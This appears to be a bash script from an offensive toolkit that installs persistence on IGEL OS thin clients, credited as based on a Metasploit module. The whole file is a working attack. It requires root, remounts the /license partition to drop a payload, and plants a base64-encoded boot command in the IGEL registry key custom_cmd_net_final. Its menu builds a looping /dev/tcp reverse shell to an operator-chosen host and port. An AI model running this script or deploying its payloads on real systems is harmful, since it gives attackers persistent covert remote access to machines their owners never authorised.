#!/bin/bash
# D3m0n1z3dShell — IGEL OS Persistence (T1546)
# Based on Metasploit igel_persistence.rb — thin client OS specific

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
MARKER="d3m0n_igel"

banner(){
    echo -e "${RED}"
    echo " ╔═══════════════════════════════════════════════════╗"
    echo " ║   IGEL OS Persistence                             ║"
    echo " ║   T1546 — Thin client registry/license abuse      ║"
    echo " ╚═══════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root(){
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[-] Root required${NC}"; exit 1; }
}

check_igel(){
    if [[ ! -d /etc/igel ]] && [[ ! -f /config/sessions/setup.ini ]]; then
        echo -e "${RED}[-] Not an IGEL OS system${NC}"
        echo -e "${YELLOW}[*] Expected /etc/igel/ or /config/sessions/setup.ini${NC}"
        return 1
    fi
    echo -e "${GREEN}[+] IGEL OS detected${NC}"
    [[ -f /etc/igel/os-release ]] && cat /etc/igel/os-release 2>/dev/null | head -5
    return 0
}

install_license(){
    local PAYLOAD="$1"
    local LICENSE_DIR="/license"

    # Remount license partition read-write
    mount -o remount,rw "$LICENSE_DIR" 2>/dev/null
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[-] Failed to remount ${LICENSE_DIR} read-write${NC}"
        return 1
    fi

    local PAYLOAD_FILE="${LICENSE_DIR}/.d3m0n_persist"
    echo "#!/bin/sh" > "$PAYLOAD_FILE"
    echo "# ${MARKER}" >> "$PAYLOAD_FILE"
    echo "$PAYLOAD" >> "$PAYLOAD_FILE"
    chmod 755 "$PAYLOAD_FILE"

    # Remount read-only
    mount -o remount,ro "$LICENSE_DIR" 2>/dev/null

    echo -e "${GREEN}[+] Payload written to ${PAYLOAD_FILE}${NC}"
    echo -e "${YELLOW}[*] Run via registry key or manual execution${NC}"
}

install_registry(){
    local PAYLOAD="$1"
    local KEY="userinterface.rccustom.custom_cmd_net_final"

    if ! command -v setparam >/dev/null 2>&1; then
        echo -e "${RED}[-] setparam not found — not IGEL OS?${NC}"
        return 1
    fi

    # Base64 encode for safe storage
    local B64_PAYLOAD=$(echo "$PAYLOAD" | base64 -w0)
    local CMD="echo '${B64_PAYLOAD}' | base64 -d | /bin/sh"

    setparam "$KEY" "$CMD" 2>/dev/null
    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}[+] Registry key set: ${KEY}${NC}"
        echo -e "${YELLOW}[*] Payload executes after network initialization at boot${NC}"
    else
        echo -e "${RED}[-] Failed to set registry key${NC}"
    fi
}

menu(){
    banner
    check_root
    check_igel || return 1

    echo -e "  ${CYAN}[1]${NC} Persist via /license partition"
    echo -e "  ${CYAN}[2]${NC} Persist via IGEL registry (setparam)"
    echo -e "  ${CYAN}[3]${NC} Cleanup"
    echo ""
    read -p "  Choice [1-3]: " OPT

    case "$OPT" in
        1)
            echo -e "  ${CYAN}[a]${NC} Reverse shell  ${CYAN}[b]${NC} Custom command"
            read -p "  Choice: " SUB
            case "$SUB" in
                a)
                    read -p "  LHOST: " LHOST
                    read -p "  LPORT: " LPORT
                    PAYLOAD="nohup /bin/sh -c 'while true; do /bin/sh -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 2>/dev/null; sleep 60; done' &"
                    install_license "$PAYLOAD"
                    ;;
                b)
                    read -p "  Command: " CMD
                    install_license "$CMD"
                    ;;
            esac
            ;;
        2)
            echo -e "  ${CYAN}[a]${NC} Reverse shell  ${CYAN}[b]${NC} Custom command"
            read -p "  Choice: " SUB
            case "$SUB" in
                a)
                    read -p "  LHOST: " LHOST
                    read -p "  LPORT: " LPORT
                    PAYLOAD="nohup /bin/sh -c 'while true; do /bin/sh -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 2>/dev/null; sleep 60; done' &"
                    install_registry "$PAYLOAD"
                    ;;
                b)
                    read -p "  Command: " CMD
                    install_registry "$CMD"
                    ;;
            esac
            ;;
        3)
            echo -e "${YELLOW}[*] Cleaning up...${NC}"
            mount -o remount,rw /license 2>/dev/null
            rm -f /license/.d3m0n_persist
            mount -o remount,ro /license 2>/dev/null
            command -v setparam >/dev/null 2>&1 && setparam "userinterface.rccustom.custom_cmd_net_final" "" 2>/dev/null
            echo -e "${GREEN}[+] Cleaned${NC}"
            ;;
    esac
}

menu
